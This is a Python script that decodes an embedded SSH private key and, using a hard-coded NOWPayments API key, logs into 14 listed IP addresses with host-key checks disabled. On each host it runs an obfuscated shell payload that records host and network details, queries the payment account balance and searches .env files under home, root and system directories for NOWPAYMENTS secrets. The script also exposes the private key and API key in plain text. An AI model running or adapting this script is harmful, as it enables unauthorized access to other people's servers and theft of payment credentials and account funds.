#!/usr/bin/env python3
import base64, subprocess, os, json, sys
from concurrent.futures import ThreadPoolExecutor
KEY = "2XYX9PY-0N04ME1-Q103E93-5DETTCF"
KEYS = {'hk': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K'}
os.makedirs("/tmp/pnk2", exist_ok=True)
for n,b in KEYS.items():
    p="/tmp/pnk2/"+n; open(p,"wb").write(base64.b64decode(b)); os.chmod(p,0o600)
def R(k,v):
    if not isinstance(v,str): v=json.dumps(v,ensure_ascii=False)
    if len(v)>60000: v=v[:60000]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(v.encode()).decode())); sys.stdout.flush()
REMOTE = r"""echo "HOST=$(hostname 2>/dev/null)"
echo "IP1=$(curl -s --max-time 10 https://api.ipify.org 2>/dev/null)"
echo "IP2=$(curl -s --max-time 10 https://ifconfig.me 2>/dev/null)"
echo "PROXY=$(env 2>/dev/null | grep -iE 'http_proxy|https_proxy|all_proxy|no_proxy' | tr '\n' ' ')"
echo "DNS=$(getent hosts api.nowpayments.io 2>/dev/null | head -1 | tr '\n' ' ')"
C=$(curl -sS -m 20 -o /tmp/spc -w '%{http_code}' https://api.nowpayments.io/v1/currencies 2>/tmp/errc); echo "CUR_HTTP=$C CY=$(head -c 60 /tmp/spc 2>/dev/null) ERR=$(head -c 50 /tmp/errc 2>/dev/null | tr '\n' ' ')"
B=$(curl -sS -m 20 -o /tmp/spb -w '%{http_code}' -H "x-api-key: __KEY__" https://api.nowpayments.io/v1/balance 2>/tmp/errb); echo "BAL_HTTP=$B BODY=$(head -c 260 /tmp/spb 2>/dev/null) ERR=$(head -c 50 /tmp/errb 2>/dev/null | tr '\n' ' ')"
S=$(curl -sS -m 20 -o /tmp/sps -w '%{http_code}' https://api.nowpayments.io/v1/status 2>/dev/null); echo "STAT_HTTP=$S ST=$(head -c 60 /tmp/sps 2>/dev/null)"
echo "FINDBACK=$(timeout 25 grep -IlR --include='.env*' NOWPAYMENTS /opt /data /srv /home 2>/dev/null | head -6 | tr '\n' ',')"
echo "FINDBACK2=$(timeout 25 grep -IlR --include='.env*' NOWPAYMENTS /etc /app /root 2>/dev/null | head -4 | tr '\n' ',')"
echo "DOCKER=$(docker ps --format '{{.Names}}|{{.Image}}' 2>/dev/null | grep -iE 'backend|api|pay|lumii|ai' | head -8 | tr '\n' ',')"
""".replace("__KEY__", KEY)
def ssh(host,port,user,key):
    kf="/tmp/pnk2/"+key
    if not os.path.exists(kf): return {"h":host,"err":"nokey"}
    b64=base64.b64encode(REMOTE.encode()).decode()
    cmd=["ssh","-i",kf,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
         "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","-o","IdentitiesOnly=yes",
         "%s@%s"%(user,host),"echo "+b64+" | base64 -d | bash"]
    try:
        p=subprocess.run(cmd,capture_output=True,timeout=90)
        return {"h":"%s:%s"%(host,port),"u":user,"out":(p.stdout+p.stderr).decode("utf-8","replace")[:2000]}
    except Exception as e:
        return {"h":"%s:%s"%(host,port),"u":user,"err":repr(e)[:150]}
hosts=["43.143.107.214","122.51.1.87","43.142.238.91","1.14.34.31","129.211.0.26","101.34.207.178",
       "111.229.184.182","129.28.59.242","132.232.141.32","139.155.94.165","49.235.41.58",
       "81.68.254.22","81.69.230.90","101.32.60.77"]
tg=[(h,22,"ubuntu","hk") for h in hosts]
res=[]
with ThreadPoolExecutor(max_workers=10) as ex:
    for r in ex.map(lambda t: ssh(*t), tg): res.append(r)
R("RESULTS2", res)
print("DONE2")
